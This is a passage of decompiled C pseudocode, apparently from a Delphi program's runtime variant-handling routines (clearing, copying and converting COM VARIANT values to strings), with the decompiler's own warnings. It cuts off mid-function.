  LONG plLbound; // [esp+Ch] [ebp-4h] BYREF

  LBound = (Variants *)SafeArrayGetLBound(psa, nDim, &plLbound);
  Variants::VarResultCheck(LBound, v5);
  UBound = (Variants *)SafeArrayGetUBound(psa, nDim, &plUbound);
  Variants::VarResultCheck(UBound, v7);
  return plUbound - plLbound + 1;
}
// 41E70F: variable 'v5' is possibly undefined
// 41E71F: variable 'v7' is possibly undefined

//----- (0041E734) --------------------------------------------------------
int __fastcall sub_41E734(VARIANTARG *pvarg, int a2)
{
  SAFEARRAY *parray; // ebp
  int v4; // ebx
  UINT v5; // esi
  char *pvData; // esi
  int v7; // ebx
  Variants *v8; // eax
  int v9; // edx
  int v11; // [esp+0h] [ebp-14h]

  if ( (pvarg->vt & 0x2000) == 0 )
    Variants::VarResultCheck((Variants *)0x80070057, a2);
  if ( (pvarg->vt & 0xFFF) == 12 )
  {
    if ( (pvarg->vt & 0x4000) != 0 )
      parray = (SAFEARRAY *)*pvarg->plVal;
    else
      parray = pvarg->parray;
    v11 = 0;
    if ( parray->cDims )
    {
      v11 = sub_41E6F8(parray, 1u);
      if ( parray->cDims >= 2u )
      {
        v4 = parray->cDims - 2 + 1;
        v5 = 2;
        do
        {
          v11 *= sub_41E6F8(parray, v5++);
          --v4;
        }
        while ( v4 );
      }
    }
    pvData = (char *)parray->pvData;
    v7 = v11;
    if ( v11 > 0 )
    {
      do
      {
        Variants::__linkproc__ VarClear(pvData);
        pvData += 16;
        --v7;
      }
      while ( v7 );
    }
  }
  v8 = (Variants *)VariantClear(pvarg);
  return Variants::VarResultCheck(v8, v9);
}
// 41E7C5: variable 'v9' is possibly undefined
// 41E868: using guessed type int __fastcall Variants::__linkproc__ VarClear(_DWORD);

//----- (0041E7D0) --------------------------------------------------------
_DWORD *__fastcall sub_41E7D0(VARIANTARG *pvarg, int a2, int a3)
{
  VARTYPE vt; // si
  Variants *v5; // eax
  int v6; // edx
  _DWORD *result; // eax
  int v8[3]; // [esp+0h] [ebp-Ch] BYREF

  v8[0] = a3;
  vt = pvarg->vt;
  if ( pvarg->vt >= 0x14u )
  {
    switch ( vt )
    {
      case 0x100u:
        pvarg->vt = 0;
        return sub_406C68(&pvarg->lVal);
      case 0x102u:
        pvarg->vt = 0;
        return sub_406C44(&pvarg->lVal);
      case 0x101u:
        return (_DWORD *)dword_46E900(pvarg);
      default:
        if ( (vt & 0x2000) != 0 )
        {
          return (_DWORD *)sub_41E734(pvarg, a2);
        }
        else if ( sub_420F78(pvarg->vt, v8, a3) )
        {
          (*(void (__fastcall **)(int, VARIANTARG *))(*(_DWORD *)v8[0] + 36))(v8[0], pvarg);
          result = 0;
          pvarg->lVal = 0;
        }
        else
        {
          VariantClear(pvarg);
          VariantInit(pvarg);
        }
        break;
    }
  }
  else
  {
    v5 = (Variants *)VariantClear(pvarg);
    return (_DWORD *)Variants::VarResultCheck(v5, v6);
  }
  return result;
}
// 41E7E4: variable 'v6' is possibly undefined
// 46E900: using guessed type int (__fastcall *dword_46E900)(_DWORD);
// 41E7D0: using guessed type int var_C[3];

//----- (0041E87C) --------------------------------------------------------
void __spoils<edx,ecx> sub_41E87C()
{
  Variants::__linkproc__ VarClear();
}
// 41E868: using guessed type int Variants::__linkproc__ VarClear(void);

//----- (0041E8B4) --------------------------------------------------------
int __usercall sub_41E8B4@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  LOBYTE(a2) = 1;
  if ( *(_DWORD *)(a3 + 8 * a1 - 768) + *(_DWORD *)(a3 + 8 * a1 - 764) <= ++*(_DWORD *)(a3 + 4 * a1 - 256) )
  {
    if ( a1 )
    {
      *(_DWORD *)(a3 + 4 * a1 - 256) = *(_DWORD *)(a3 + 8 * a1 - 764);
      return sub_41E8B4(a3);
    }
    else
    {
      return 0;
    }
  }
  return a2;
}

//----- (0041EAE0) --------------------------------------------------------
volatile __int32 *__fastcall sub_41EAE0(VARIANTARG *a1, VARIANTARG *pvargSrc, int a3)
{
  VARTYPE vt; // ax
  Variants *v6; // eax
  int v7; // edx
  volatile __int32 *result; // eax
  VARTYPE v9; // di
  Variants *v10; // eax
  int v11; // edx
  int v12[4]; // [esp+0h] [ebp-10h] BYREF

  v12[0] = a3;
  if ( (a1->vt & 0xBFE8) != 0 )
    sub_41E7D0(a1, (int)pvargSrc, a3);
  else
    a1->lVal = 0;
  vt = pvargSrc->vt;
  if ( pvargSrc->vt >= 0x14u )
  {
    if ( vt == 256 )
    {
      a1->vt = 256;
      a1->lVal = 0;
      return sub_407084(&a1->lVal, pvargSrc->lVal);
    }
    else if ( vt == 258 )
    {
      a1->vt = 258;
      a1->lVal = 0;
      return sub_406FE8(&a1->lVal, pvargSrc->lVal);
    }
    else
    {
      v9 = pvargSrc->vt;
      if ( pvargSrc->vt == 16642 || v9 == 16640 )
      {
        a1->vt = v9;
        result = pvargSrc->plVal;
        a1->lVal = (LONG)result;
      }
      else if ( v9 == 257 )
      {
        a1->vt = 257;
        a1->lVal = pvargSrc->lVal;
        return (volatile __int32 *)dword_46E908(a1);
      }
      else if ( (v9 & 0x2000) != 0 )
      {
        return (volatile __int32 *)unknown_libname_108((int)a1, pvargSrc);
      }
      else if ( sub_420F78(pvargSrc->vt, v12, a3) )
      {
        return (volatile __int32 *)(*(int (__fastcall **)(int, VARIANTARG *, VARIANTARG *, _DWORD))(*(_DWORD *)v12[0]
                                                                                                  + 40))(
                                     v12[0],
                                     a1,
                                     pvargSrc,
                                     0);
      }
      else
      {
        v10 = (Variants *)VariantCopy(a1, pvargSrc);
        return (volatile __int32 *)Variants::VarResultCheck(v10, v11);
      }
    }
  }
  else
  {
    v6 = (Variants *)VariantCopy(a1, pvargSrc);
    return (volatile __int32 *)Variants::VarResultCheck(v6, v7);
  }
  return result;
}
// 41EB0D: variable 'v7' is possibly undefined
// 41EBA5: variable 'a3' is possibly undefined
// 41EBC6: variable 'v11' is possibly undefined
// 46E908: using guessed type int (__fastcall *dword_46E908)(_DWORD);
// 41EAE0: using guessed type int var_10[4];

//----- (0041EBD0) --------------------------------------------------------
VARIANTARG *__fastcall sub_41EBD0(VARIANTARG *result, VARIANTARG *pvargSrc, int a3)
{
  VARIANTARG *v4; // esi

  v4 = result;
  if ( result != pvargSrc )
  {
    if ( (pvargSrc->vt & 0xBFE8) != 0 )
    {
      return (VARIANTARG *)sub_41EAE0(result, pvargSrc, a3);
    }
    else
    {
      if ( (result->vt & 0xBFE8) != 0 )
        sub_41E7D0(result, (int)pvargSrc, a3);
      return (VARIANTARG *)System::Move(pvargSrc, v4, 16);
    }
  }
  return result;
}

//----- (0041EDFC) --------------------------------------------------------
int __fastcall sub_41EDFC(VARIANTARG *pvargSrc, int a2, int a3)
{
  int v6; // ecx
  int v7; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v10; // [esp-8h] [ebp-24h]
  int *v11; // [esp-4h] [ebp-20h]
  void *v12; // [esp+0h] [ebp-1Ch]
  VARIANTARG pvarg; // [esp+Ch] [ebp-10h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  VariantInit(&pvarg);
  v11 = &savedregs;
  v10 = &loc_41EE57;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_41EBD0(&pvarg, pvargSrc, v6);
  dword_46E904(&pvarg, v7);
  sub_41EEF0(a3, &pvarg, a2);
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_41EE5E;
  return Variants::__linkproc__ VarClear(&pvarg);
}
// 41EE27: variable 'v6' is possibly undefined
// 41EE2F: variable 'v7' is possibly undefined
// 41E868: using guessed type int __fastcall Variants::__linkproc__ VarClear(_DWORD);
// 41EEF0: using guessed type int __fastcall sub_41EEF0(_DWORD, _DWORD, _DWORD);
// 46E904: using guessed type int (__fastcall *dword_46E904)(_DWORD, _DWORD);

//----- (0041EEF0) --------------------------------------------------------
int __usercall sub_41EEF0@<eax>(CHAR **a1@<eax>, VARIANTARG *a2@<edx>, __int32 a3@<ecx>, int a4@<edi>)
{
  int v4; // ecx
  int vt; // eax
  int v8; // edx
  const WCHAR *bstrVal; // edx
  BOOL *v10; // eax
  int v11; // edx
  BOOL *plVal; // edi
  const WCHAR *v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  _DWORD *v20; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-DCh] BYREF
  void *v23; // [esp-14h] [ebp-D8h]
  int *v24; // [esp-10h] [ebp-D4h]
  unsigned int v25[2]; // [esp-Ch] [ebp-D0h] BYREF
  int *v26; // [esp-4h] [ebp-C8h]
  const WCHAR *v27; // [esp+Ch] [ebp-B8h] BYREF
  const WCHAR *v28[2]; // [esp+10h] [ebp-B4h] BYREF
  const WCHAR *v29; // [esp+18h] [ebp-ACh] BYREF
  const WCHAR *v30; // [esp+1Ch] [ebp-A8h] BYREF
  const WCHAR *v31; // [esp+20h] [ebp-A4h] BYREF
  const WCHAR *v32; // [esp+24h] [ebp-A0h] BYREF
  const WCHAR *v33; // [esp+28h] [ebp-9Ch] BYREF
  const WCHAR *v34; // [esp+2Ch] [ebp-98h] BYREF
  int v35; // [esp+30h] [ebp-94h] BYREF
  int v36; // [esp+34h] [ebp-90h] BYREF
  const WCHAR *v37; // [esp+38h] [ebp-8Ch] BYREF
  const WCHAR *v38; // [esp+3Ch] [ebp-88h] BYREF
  __int32 v39; // [esp+40h] [ebp-84h] BYREF
  const WCHAR *v40[2]; // [esp+44h] [ebp-80h] BYREF
  const WCHAR *v41; // [esp+4Ch] [ebp-78h] BYREF
  const WCHAR *v42; // [esp+50h] [ebp-74h] BYREF
  const WCHAR *v43; // [esp+54h] [ebp-70h] BYREF
  const WCHAR *v44; // [esp+58h] [ebp-6Ch] BYREF
  const WCHAR *v45; // [esp+5Ch] [ebp-68h] BYREF
  const WCHAR *v46; // [esp+60h] [ebp-64h] BYREF
  int v47; // [esp+64h] [ebp-60h] BYREF
  int v48; // [esp+68h] [ebp-5Ch] BYREF
  const WCHAR *v49; // [esp+6Ch] [ebp-58h] BYREF
  const WCHAR *v50; // [esp+70h] [ebp-54h] BYREF
  long double v51; // [esp+74h] [ebp-50h]
  long double v52; // [esp+84h] [ebp-40h]
  long double dblVal; // [esp+94h] [ebp-30h]
  long double fltVal; // [esp+A4h] [ebp-20h]
  unsigned __int16 v55; // [esp+B2h] [ebp-12h]
  int v56; // [esp+B4h] [ebp-10h] BYREF
  int v57; // [esp+B8h] [ebp-Ch] BYREF
  int v58; // [esp+BCh] [ebp-8h] BYREF
  int v59; // [esp+C0h] [ebp-4h] BYREF
  int savedregs; // [esp+C4h] [ebp+0h] BYREF

  v4 = _InterlockedExchange(&v59, a3);
  v55 = v4;
  v26 = &savedregs;
  v25[1] = (unsigned int)&loc_41F6EC;
  v25[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v25);
  vt = a2->vt;
  v8 = (unsigned __int16)vt;
  switch ( (__int16)vt )
  {
    case 0:
      sub_406C68(a1);
      goto LABEL_70;
    case 1:
      if ( byte_466584 )
      {
        LOWORD(v8) = 256;
        LOWORD(vt) = 1;
        sub_41E228(vt, v8, a4);
      }
      sub_407634(a1, (const WCHAR *)dword_466588, 0, v25[0]);
      goto LABEL_70;
    case 2:
      sub_415150(a2->iVal, (int *)&v50);
      sub_407634(a1, v50, 0, v25[0]);
      goto LABEL_70;
    case 3:
      sub_415150(a2->lVal, (int *)&v49);
      sub_407634(a1, v49, 0, v25[0]);
      goto LABEL_70;
    case 4:
      v24 = &savedregs;
      v23 = &loc_41F055;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      fltVal = a2->fltVal;
      sub_4173D8(off_46811C, &v59, v4, SBYTE8(fltVal), SDWORD1(fltVal), SLODWORD(fltVal));
      sub_407634(a1, (const WCHAR *)v59, 0, (unsigned __int16)ExceptionList);
      __writefsdword(0, (unsigned int)v23);
      v25[0] = (unsigned int)&loc_41F66F;
      sub_406C44(&v59);
      goto LABEL_70;
    case 5:
      v24 = &savedregs;
      v23 = &loc_41F0AE;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      dblVal = a2->dblVal;
      sub_4173D8(off_46811C, &v58, v4, SBYTE8(dblVal), SDWORD1(dblVal), SLODWORD(dblVal));
      sub_407634(a1, (const WCHAR *)v58, 0, (unsigned __int16)ExceptionList);
      __writefsdword(0, (unsigned int)v23);
      v25[0] = (unsigned int)&loc_41F66F;
      sub_406C44(&v58);
      goto LABEL_70;
    case 6:
      unknown_libname_109((int)&v48, (unsigned __int16)vt, v4, a2->cyVal.Hi, a2->lVal);
      sub_4072BC(a1, (const WCHAR *)v48, 0, v25[0]);
      goto LABEL_70;
    case 7:
      unknown_libname_110((int)&v47, (unsigned __int16)vt, v4, a2->cyVal.Hi, a2->lVal);
      sub_4072BC(a1, (const WCHAR *)v47, 0, v25[0]);
      goto LABEL_70;
    case 8:
      bstrVal = a2->bstrVal;
      v10 = (BOOL *)bstrVal;
      if ( bstrVal )
        v10 = (BOOL *)(*((_DWORD *)bstrVal - 1) >> 1);
LABEL_14:
      sub_407CFC(a1, bstrVal, v10, v55);
      goto LABEL_70;
    case 9:
    case 13:
      unknown_libname_112(a2, v40);
      sub_407634(a1, v40[0], 0, v25[0]);
      goto LABEL_70;
    case 11:
      unknown_libname_111(a2->uiVal, &v46);
      sub_4072BC(a1, v46, 0, v25[0]);
      goto LABEL_70;
    case 12:
      goto LABEL_22;
    case 16:
      sub_415150(a2->cVal, (int *)&v45);
      sub_407634(a1, v45, 0, v25[0]);
      goto LABEL_70;
    case 17:
      sub_415150(a2->bVal, (int *)&v44);
      sub_407634(a1, v44, 0, v25[0]);
      goto LABEL_70;
    case 18:
      sub_415150(a2->uiVal, (int *)&v43);
      sub_407634(a1, v43, 0, v25[0]);
      goto LABEL_70;
    case 19:
      unknown_libname_74(a2->lVal, &v42);
      sub_407634(a1, v42, 0, v25[0]);
      goto LABEL_70;
    case 20:
      sub_415178((int *)&v41, (unsigned __int16)vt, v4, a2->llVal);
      sub_407634(a1, v41, 0, v25[0]);
      goto LABEL_70;
    case 21:
      unknown_libname_75(a2->lVal, a2->cyVal.Hi);
      sub_407634(a1, v40[1], 0, v25[0]);
      goto LABEL_70;
    default:
      HIWORD(v11) = HIWORD(vt);
      if ( (_WORD)vt == 256 )
      {
        sub_407084((volatile __int32 *)a1, a2->lVal);
        goto LABEL_70;
      }
      if ( (_WORD)vt == 257 )
      {
        sub_41EDFC(a2, v55, (int)&v39);
        sub_407084((volatile __int32 *)a1, v39);
        goto LABEL_70;
      }
      LOWORD(v11) = vt - 258;
      if ( (_WORD)vt == 258 )
      {
        plVal = a2->plVal;
        if ( plVal )
          plVal = (BOOL *)*(plVal - 1);
        v24 = (int *)v55;
        v13 = (const WCHAR *)sub_407790(a2->lVal);
        sub_407CFC(a1, v13, plVal, (unsigned __int16)v24);
      }
      else if ( (vt & 0x4000) != 0 )
      {
        v14 = vt & 0xBFFF;
        if ( v14 > 12 )
        {
          if ( v14 > 20 )
          {
            v18 = v14 - 21;
            if ( !v18 )
            {
              unknown_libname_75(*a2->plVal, *(_DWORD *)(a2->lVal + 4));
              sub_407634(a1, v28[1], 0, v25[0]);
              goto LABEL_70;
            }
            v19 = v18 - 235;
            if ( !v19 )
            {
              sub_407248(a1, *(_BYTE **)a2->lVal, 0, v25[0]);
              goto LABEL_70;
            }
            if ( v19 == 2 )
            {
              sub_40727C(a1, *a2->plVal, 0, v25[0]);
              goto LABEL_70;
            }
          }
          else
          {
            if ( v14 == 20 )
            {
              sub_415178((int *)&v29, v11, v4, *a2->pllVal);
              sub_407634(a1, v29, 0, v25[0]);
              goto LABEL_70;
            }
            v15 = v14 - 16;
            if ( !v15 )
            {
              sub_415150(*a2->pcVal, (int *)&v33);
              sub_407634(a1, v33, 0, v25[0]);
              goto LABEL_70;
            }
            v16 = v15 - 1;
            if ( !v16 )
            {
              sub_415150(*a2->pbVal, (int *)&v32);
              sub_407634(a1, v32, 0, v25[0]);
              goto LABEL_70;
            }
            v17 = v16 - 1;
            if ( !v17 )
            {
              sub_415150(*a2->bstrVal, (int *)&v31);
              sub_407634(a1, v31, 0, v25[0]);
              goto LABEL_70;
            }
            if ( v17 == 1 )
            {
              unknown_libname_74(*a2->plVal, &v30);
              sub_407634(a1, v30, 0, v25[0]);
              goto LABEL_70;
            }
          }
LABEL_67:
          unknown_libname_112(a2, v28);
          sub_407634(a1, v28[0], 0, v25[0]);
        }
        else if ( v14 == 12 )
        {
LABEL_22:
          sub_41EEF0(a1, a2->lVal, 0);
        }
        else
        {
          switch ( v14 )
          {
            case 2:
              sub_415150(*a2->piVal, (int *)&v38);
              sub_407634(a1, v38, 0, v25[0]);
              break;
            case 3:
              sub_415150(*a2->plVal, (int *)&v37);
              sub_407634(a1, v37, 0, v25[0]);
              break;
            case 4:
              v24 = &savedregs;
              v23 = &loc_41F3F0;
              ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
              __writefsdword(0, (unsigned int)&ExceptionList);
              v52 = *a2->pfltVal;
              sub_4173D8(off_46811C, &v57, v4, SBYTE8(v52), SDWORD1(v52), SLODWORD(v52));
              sub_407634(a1, (const WCHAR *)v57, 0, (unsigned __int16)ExceptionList);
              __writefsdword(0, (unsigned int)v23);
              v25[0] = (unsigned int)&loc_41F66F;
              sub_406C44(&v57);
              break;
            case 5:
              v24 = &savedregs;
              v23 = &loc_41F44B;
              ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
              __writefsdword(0, (unsigned int)&ExceptionList);
              v51 = *a2->pdblVal;
              sub_4173D8(off_46811C, &v56, v4, SBYTE8(v51), SDWORD1(v51), SLODWORD(v51));
              sub_407634(a1, (const WCHAR *)v56, 0, (unsigned __int16)ExceptionList);
              __writefsdword(0, (unsigned int)v23);
              v25[0] = (unsigned int)&loc_41F66F;
              sub_406C44(&v56);
              break;
            case 6:
              unknown_libname_109((int)&v36, v11, v4, *(_DWORD *)(a2->lVal + 4), *a2->plVal);
              sub_4072BC(a1, (const WCHAR *)v36, 0, v25[0]);
              break;
            case 7:
              unknown_libname_110((int)&v35, v11, v4, *(_DWORD *)(a2->lVal + 4), *a2->plVal);
              sub_4072BC(a1, (const WCHAR *)v35, 0, v25[0]);
              break;
            case 8:
              bstrVal = (const WCHAR *)*a2->plVal;
              v10 = (BOOL *)bstrVal;
              if ( bstrVal )
                v10 = (BOOL *)(*((_DWORD *)bstrVal - 1) >> 1);
              goto LABEL_14;
            case 11:
              unknown_libname_111(*a2->bstrVal, &v34);
              sub_4072BC(a1, v34, 0, v25[0]);
              break;
            default:
              goto LABEL_67;
          }
        }
      }
      else
      {
        v20 = sub_406C68(a1);
        if ( !(unsigned __int8)unknown_libname_113(a2, v20) )
        {
          unknown_libname_112(a2, &v27);
          sub_407634(a1, v27, 0, v25[0]);
        }
      }
LABEL_70:
      __writefsdword(0, v25[0]);
      v26 = (int *)&loc_41F6F3;
      sub_406CA4((int)&v27, 8);
      System::__linkproc__ WStrArrayClr(&v34, 3);
      sub_406CA4((int)&v37, 2);
      sub_406C68(&v39);
      sub_406CA4((int)v40, 7);
      System::__linkproc__ WStrArrayClr(&v46, 3);
      sub_406CA4((int)&v49, 2);
      return sub_406CA4((int)&v56, 4);
  }
}
// 406D04: using guessed type int __fastcall System::__linkproc__ WStrArrayClr(_DWORD, _DWORD);
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 41EC7C: using guessed type int __fastcall unknown_libname_111(_DWORD, _DWORD);
// 41ED44: using guessed type int __fastcall unknown_libname_112(_DWORD, _DWORD);
// 41EE68: using guessed type int __fastcall unknown_libname_113(_DWORD, _DWORD);
// 466584: using guessed type char byte_466584;
// 466588: using guessed type int dword_466588;

//----- (0041F82C) --------------------------------------------------------
BOOL __fastcall sub_41F82C(unsigned __int16 *a1, _DWORD *a2)
{
  _DWORD v4[3]; // [esp-18h] [ebp-40h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-34h] BYREF
  void *v6; // [esp-8h] [ebp-30h]
  int *v7; // [esp-4h] [ebp-2Ch]
  void *v8; // [esp+0h] [ebp-28h]
  int v9; // [esp+4h] [ebp-24h] BYREF
  int v10; // [esp+8h] [ebp-20h] BYREF
  VARIANTARG pvarg; // [esp+Ch] [ebp-1Ch] BYREF
  int v12; // [esp+1Ch] [ebp-Ch] BYREF
  bool v13; // [esp+23h] [ebp-5h]
  _DWORD *v14; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v14 = a2;
  if ( a2 )
    *a2 = 0;
  v7 = &savedregs;
  v6 = &loc_41F8F7;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v13 = sub_420F78(*a1, &v12, 0);
  if ( v13 )
  {
    VariantInit(&pvarg);
    v4[2] = &savedregs;
    v4[1] = &loc_41F8D5;
    v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    (*(void (__fastcall **)(int, VARIANTARG *, unsigned __int16 *, struct _EXCEPTION_REGISTRATION_RECORD *, int *, void *, _DWORD, int))(*(_DWORD *)v12 + 28))(
      v12,
      &pvarg,
      a1,
      ExceptionList,
      &savedregs,
      &loc_41F8D5,
      v4[0],
      8);
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&v10;
    unknown_libname_50(&v9, pvarg.lVal);
    sub_407AD8(v9, 1, 0x7FFFFFFF, ExceptionList);
    System::__linkproc__ WStrFromLStr(v14, v10);
    __writefsdword(0, (unsigned int)v6);
    v8 = &loc_41F8DC;
    Variants::__linkproc__ VarClear(&pvarg);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v7 = (int *)&loc_41F8FE;
  sub_406CA4((int)&v9, 2);
  return v13;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 407874: using guessed type int __fastcall System::__linkproc__ WStrFromLStr(_DWORD, _DWORD);
// 41E868: using guessed type int __fastcall Variants::__linkproc__ VarClear(_DWORD);
// 41F82C: using guessed type int var_C;

//----- (0041F908) --------------------------------------------------------
int __usercall sub_41F908@<eax>(BSTR *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int vt; // eax
  int v7; // edx
  int v8; // edx
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-D8h] BYREF
  void *v18; // [esp-14h] [ebp-D4h]
  int *v19; // [esp-10h] [ebp-D0h]
  int v20[2]; // [esp-Ch] [ebp-CCh] BYREF
  int *v21; // [esp-4h] [ebp-C4h]
  OLECHAR *v22; // [esp+8h] [ebp-B8h] BYREF
  OLECHAR *v23; // [esp+Ch] [ebp-B4h] BYREF
  int v24; // [esp+10h] [ebp-B0h] BYREF
  int v25; // [esp+14h] [ebp-ACh] BYREF
  int v26; // [esp+18h] [ebp-A8h] BYREF
  int v27; // [esp+1Ch] [ebp-A4h] BYREF
  int v28; // [esp+20h] [ebp-A0h] BYREF
  int v29; // [esp+24h] [ebp-9Ch] BYREF
  OLECHAR *v30; // [esp+28h] [ebp-98h] BYREF
  OLECHAR *v31; // [esp+2Ch] [ebp-94h] BYREF
  OLECHAR *v32; // [esp+30h] [ebp-90h] BYREF
  int v33; // [esp+34h] [ebp-8Ch] BYREF
  int v34; // [esp+38h] [ebp-88h] BYREF
  OLECHAR *v35; // [esp+3Ch] [ebp-84h] BYREF
  OLECHAR *v36; // [esp+40h] [ebp-80h] BYREF
  int v37; // [esp+44h] [ebp-7Ch] BYREF
  int v38; // [esp+48h] [ebp-78h] BYREF
  int v39; // [esp+4Ch] [ebp-74h] BYREF
  int v40; // [esp+50h] [ebp-70h] BYREF
  int v41; // [esp+54h] [ebp-6Ch] BYREF
  int v42; // [esp+58h] [ebp-68h] BYREF
  OLECHAR *v43; // [esp+5Ch] [ebp-64h] BYREF
  OLECHAR *v44; // [esp+60h] [ebp-60h] BYREF
  OLECHAR *v45; // [esp+64h] [ebp-5Ch] BYREF
  int v46; // [esp+68h] [ebp-58h] BYREF
  int v47; // [esp+6Ch] [ebp-54h] BYREF
  long double v48; // [esp+70h] [ebp-50h]
  long double v49; // [esp+80h] [ebp-40h]
  long double dblVal; // [esp+90h] [ebp-30h]
  long double fltVal; // [esp+A0h] [ebp-20h]
  int v52; // [esp+B0h] [ebp-10h] BYREF
  int v53; // [esp+B4h] [ebp-Ch] BYREF
  int v54; // [esp+B8h] [ebp-8h] BYREF
  int v55; // [esp+BCh] [ebp-4h] BYREF
  int savedregs; // [esp+C0h] [ebp+0h] BYREF

  v21 = &savedregs;
  v20[1] = (int)&loc_42002B;
  v20[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v20);
  vt = a2->vt;
  v7 = (unsigned __int16)vt;
  switch ( (__int16)vt )
  {
    case 0:
      System::__linkproc__ WStrClr(a1, (unsigned __int16)vt);
      goto LABEL_64;
    case 1:
      if ( byte_466584 )
      {
        LOWORD(v7) = 8;
        LOWORD(vt) = 1;
        sub_41E228(vt, v7, a4);
      }
      System::__linkproc__ WStrFromLStr(a1, dword_466588);
      goto LABEL_64;
    case 2:
      sub_415150(a2->iVal, &v47);
      System::__linkproc__ WStrFromLStr(a1, v47);
      goto LABEL_64;
    case 3:
      sub_415150(a2->lVal, &v46);
      System::__linkproc__ WStrFromLStr(a1, v46);
      goto LABEL_64;
    case 4:
      v19 = &savedregs;
      v18 = &loc_41FA4F;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      fltVal = a2->fltVal;
      sub_4173D8(off_46811C, &v55, a3, SBYTE8(fltVal), SDWORD1(fltVal), SLODWORD(fltVal));
      System::__linkproc__ WStrFromLStr(a1, v55);
      __writefsdword(0, (unsigned int)ExceptionList);
      v19 = (int *)&loc_41FF99;
      sub_406C44(&v55);
      goto LABEL_64;
    case 5:
      v19 = &savedregs;
      v18 = &loc_41FAA3;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      dblVal = a2->dblVal;
      sub_4173D8(off_46811C, &v54, a3, SBYTE8(dblVal), SDWORD1(dblVal), SLODWORD(dblVal));
      System::__linkproc__ WStrFromLStr(a1, v54);
      __writefsdword(0, (unsigned int)ExceptionList);
      v19 = (int *)&loc_41FF99;
      sub_406C44(&v54);
      goto LABEL_64;
    case 6:
      unknown_libname_109((int)&v45, (unsigned __int16)vt, a3, a2->cyVal.Hi, a2->lVal);
      System::__linkproc__ WStrAsg(a1, v45);
      goto LABEL_64;
    case 7:
      unknown_libname_110((int)&v44, (unsigned __int16)vt, a3, a2->cyVal.Hi, a2->lVal);
      System::__linkproc__ WStrAsg(a1, v44);
      goto LABEL_64;
    case 8:
      sub_4076FC(a2->lVal, 1, 0x7FFFFFFF, a1);
      goto LABEL_64;
    case 9:
    case 13:
      unknown_libname_114(a2, &v36);
      System::__linkproc__ WStrAsg(a1, v36);
      goto LABEL_64;
    case 11:
      unknown_libname_111(a2->uiVal, &v43);
      System::__linkproc__ WStrAsg(a1, v43);
      goto LABEL_64;
    case 12:
      goto LABEL_20;
    case 16:
      sub_415150(a2->cVal, &v42);
      System::__linkproc__ WStrFromLStr(a1, v42);
      goto LABEL_64;
    case 17:
      sub_415150(a2->bVal, &v41);
      System::__linkproc__ WStrFromLStr(a1, v41);
      goto LABEL_64;
    case 18:
      sub_415150(a2->uiVal, &v40);
      System::__linkproc__ WStrFromLStr(a1, v40);
      goto LABEL_64;
    case 19:
      unknown_libname_74(a2->lVal, &v39);
      System::__linkproc__ WStrFromLStr(a1, v39);
      goto LABEL_64;
    case 20:
      sub_415178(&v38, (unsigned __int16)vt, a3, a2->llVal);
      System::__linkproc__ WStrFromLStr(a1, v38);
      goto LABEL_64;
    case 21:
      unknown_libname_75(a2->lVal, a2->cyVal.Hi);
      System::__linkproc__ WStrFromLStr(a1, v37);
      goto LABEL_64;
    default:
      HIWORD(v8) = HIWORD(vt);
      if ( (_WORD)vt == 256 )
      {
        sub_4076C8((const void **)a1, a2->lVal, v20[0]);
        goto LABEL_64;
      }
      if ( (_WORD)vt == 257 )
      {
        unknown_libname_115(a2);
        System::__linkproc__ WStrAsg(a1, v35);
        goto LABEL_64;
      }
      LOWORD(v8) = vt - 258;
      if ( (_WORD)vt == 258 )
      {
        System::__linkproc__ WStrFromLStr(a1, a2->lVal);
        goto LABEL_64;
      }
      if ( (vt & 0x4000) != 0 )
      {
        v9 = vt & 0xBFFF;
        if ( v9 > 12 )
        {
          if ( v9 > 20 )
          {
            v13 = v9 - 21;
            if ( !v13 )
            {
              unknown_libname_75(*a2->plVal, *(_DWORD *)(a2->lVal + 4));
              System::__linkproc__ WStrFromLStr(a1, v24);
              goto LABEL_64;
            }
            v14 = v13 - 235;
            if ( !v14 )
            {
              unknown_libname_46(a1, *a2->plVal);
              goto LABEL_64;
            }
            if ( v14 == 2 )
            {
LABEL_50:
